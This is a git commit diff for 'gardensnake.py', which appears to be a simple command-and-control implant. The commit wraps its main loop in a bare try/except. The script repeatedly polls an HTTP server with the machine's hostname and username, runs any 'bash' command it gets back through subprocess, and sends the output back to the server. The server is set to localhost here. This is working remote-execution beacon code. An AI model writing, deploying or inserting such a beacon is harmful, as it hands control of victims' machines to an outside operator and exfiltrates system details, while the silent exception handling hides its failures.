88cc0648884d37985931bb7842b1f80dbcc40249
Milkshak3s <justchris.vantine@gmail.com>
2017-11-28 23:31:36 -0500

    Try blocks are important

--- gardensnake.py
+++ gardensnake.py
@@ -5,27 +5,29 @@ import time
 import subprocess
 
 while True:
-    host = "localhost"
-    hostname = socket.gethostname()
-    username = getpass.getuser()
-    content = urllib.request.urlopen('http://' + host + "/conn/" + hostname + "/" + username + "/").readline()
-    content = str(content)[2:-1]
-    commands = []
-    
-    if content == '':
+    try:
+        host = "localhost"
+        hostname = socket.gethostname()
+        username = getpass.getuser()
+        content = urllib.request.urlopen('http://' + host + "/conn/" + hostname + "/" + username + "/").readline()
+        content = str(content)[2:-1]
+        commands = []
+        
+        if content == '':
+            time.sleep(2)
+            continue
+        else:
+            commands = content.split(': ')
+        
+        if commands[0] == 'bash':
+            process = subprocess.Popen(commands[1].split(), stdout=subprocess.PIPE)
+            output, error = process.communicate()
+            output = str(output)[2:-1]
+            print(output)
+            urllib.request.urlopen('http://' + host + "/out/" + hostname + "/" + str(output) + "/")
+        else:
+            pass
+        
         time.sleep(2)
-        continue
-    else:
-        commands = content.split(': ')
-    
-    if commands[0] == 'bash':
-        process = subprocess.Popen(commands[1].split(), stdout=subprocess.PIPE)
-        output, error = process.communicate()
-        output = str(output)[2:-1]
-        print(output)
-        urllib.request.urlopen('http://' + host + "/out/" + hostname + "/" + str(output) + "/")
-    else:
+    except:
         pass
-
-
-    time.sleep(2)
